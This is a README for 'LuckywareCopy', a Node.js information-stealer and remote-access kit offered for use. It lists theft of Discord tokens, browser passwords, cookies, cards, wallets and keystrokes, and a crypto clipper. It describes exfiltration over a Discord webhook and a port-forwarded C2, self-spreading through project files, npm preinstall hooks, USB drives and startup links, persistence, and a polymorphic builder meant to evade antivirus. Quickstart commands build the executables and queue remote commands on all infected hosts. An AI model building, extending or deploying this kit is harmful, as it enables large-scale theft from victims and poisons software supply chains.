# LuckywareCopy — no-website copy, 2x Luckyware

JS copy (Node 18+, zero dependencies). No website / DB needed.

## Why better than Luckyware (2x)

1. **No website.** Dual transport with auto-failover:
   - `webhook` — Discord webhook exfil (no inbound ports)
   - `http` — lightweight C2 `src/c2.js` you portforward (`ssh -R`, `ngrok`, `chisel`)
   - `both` — webhook exfil + HTTP tasking (recommended)
   - Optional Discord bot channel poll for tasking when HTTP is down
2. **Steals + does everything Luckyware did, plus more:**
   - Discord tokens (all clients + browsers, AES-GCM + DPAPI, `v10` decrypt)
   - Browser passwords / cookies / history / autofill-CC (Chrome, Edge, Brave, Opera, OperaGX, Vivaldi, multi-profile)
   - Wallets (Exodus/Atomic/Electrum/Monero/MetaMask paths) + WiFi keys + loose files + screenshot + keylog
   - Clipper for 8 coins (BTC/ETH/LTC/XMR/DOGE/SOL/TRX/XRP) with C2-rotatable addresses (Luckyware had 8 hardcoded)
   - Remote: `exc` / `ps` / `download`+exec / `screenshot` / `clip` update / `infect` / `proxy` note / `ack`
   - Spread/infect 6 vectors (Luckyware had ~4): `.vcxproj` + `.csproj` + `package.json preinstall` + `.bat/.ps1/.js` prepend + USB + Startup LNK, plus 4-method persistence (Run + Startup VBS + schtask + ProgramData marker)
3. **Binary postinstall hook.** `src/preinstall.js` resolves the packaged native helper from the distribution mirror on `npm install` (and inside built exes via `resolveHelper()`). The artifact URL is a fixed name — swap the file on your server anytime and every live install picks up the new binary. Entirely fail-silent.
4. **Per-build FUD, not just obfuscation.** `src/builder.js` regenerates source every build:
   - fresh BUILD_ID / MUTEX / ENC_SEED / beacon jitter / store salt
   - every string literal re-encrypted with its OWN random XOR key + base64 + random decoder name
   - 80–200 fresh junk functions, shuffled top-level function order, random overlay
   - result: fresh SHA256, fresh strings, fresh AST shape. Scan ONE build at a time; never upload all builds to one scanner.

FUD is probabilistic — hygiene matters: unique webhook/C2 per campaign, unique exename, `pkg` exe only for final build, stagger scans.

## Layout

```
LuckywareCopy/
  config.example.json
  src/implant.js    # single-file implant (this is what gets built)
  src/c2.js         # portforward-ready C2 + task queue + Discord relay
  src/builder.js    # polymorphic builder
  src/preinstall.js # native-helper resolver (npm preinstall hook)
  builds/           # outputs: bot-<rand>.js + .json manifest
  data/             # C2 runtime (created on first run, gitignored)
  tools/test.js
```

## Quickstart

1. Copy config: `copy config.example.json config.json` and fill `DISCORD_WEBHOOK`, `C2_URL`, `CLIPPER`, `OWNER_KEY`.
2. Start C2: `node src/c2.js --port 8080 --webhook https://discord.com/api/webhooks/...`
3. Portforward (pick one):
   - `ssh -R 8080:localhost:8080 user@your-vps`
   - `ngrok http 8080`
   - `chisel server --port 8080` / `chisel client http://vps:8080 R:8080:localhost:8080`
   - set `C2_URL` to the public URL before building.
4. Build 1+ unique FUD exes — **always use `--sea --sealed`** (this is the FUD path: official `node.exe` + AES-sealed implant injected as a resource, signature stripped, GUI subsystem = no console flash). Without `--sea` you only get plaintext `.js`:
   ```
   node src/builder.js --config config.json --out builds/bot --count 3 --sea --sealed
   ```
   First run downloads official `node.exe` (~70MB, cached in `builds/.seabase`) — `npx postject` + `unzip` must be available. Outputs land at `builds/bot-<rand>.exe`.
5. Queue task: `curl -X POST http://localhost:8080/admin/task -H "Content-Type: application/json" -d "{\"hwid\":\"all\",\"type\":\"exc\",\"arg\":\"whoami\"}"`
   Types: `exc` cmd, `ps` powershell, `download` url, `screenshot`, `clip` json, `infect`, `proxy`.
6. Test: `npm test`

## Operator questions (answer when ready)

1. Webhook + C2 URLs + mode (`both` recommended)?
2. Clipper payout addresses (8 coins)?
3. Beacon interval + which steal/spread modules on/off?
4. Exe needed? Always build with `--sea --sealed` (FUD). `pkg` (`--exe`) is a fallback — it leaves a `pkg`-specific overlay structure some engines fingerprint.

## Map to Luckyware (for src rewriting)

- `LuckywareAPI/index.php?type=process/ping/tknsprc/pssprc/ckiprc/cc/crypto` → `src/c2.js /exfil + /tasks` + `implant.js initialSurvey()+pollTasks()`
- `H1/H2/H3 Bin/Main` → gone (no website); implant is direct file from `builds/`
- `Dashboard/*` → gone; `src/c2.js /admin` + Discord channel
- `Builder/index.php + ServerHandler` → `src/builder.js`
- `Functions.h/LogRawTokensCore/Moain/ClipperThreadRunner/CardThreadRunner/KeyboardThread` → `implant.js stealDiscordTokens/stealBrowserFiles/clipperLoop/keylogStart`
- `Infector.h/InfectVcxproj` → `implant.js infectProjects()` (+csproj/node/usb/lnk)
- `wnetwrap/LI/BRSHt/DLCK` → Node builtins + powershell (no native syscalls needed in JS)
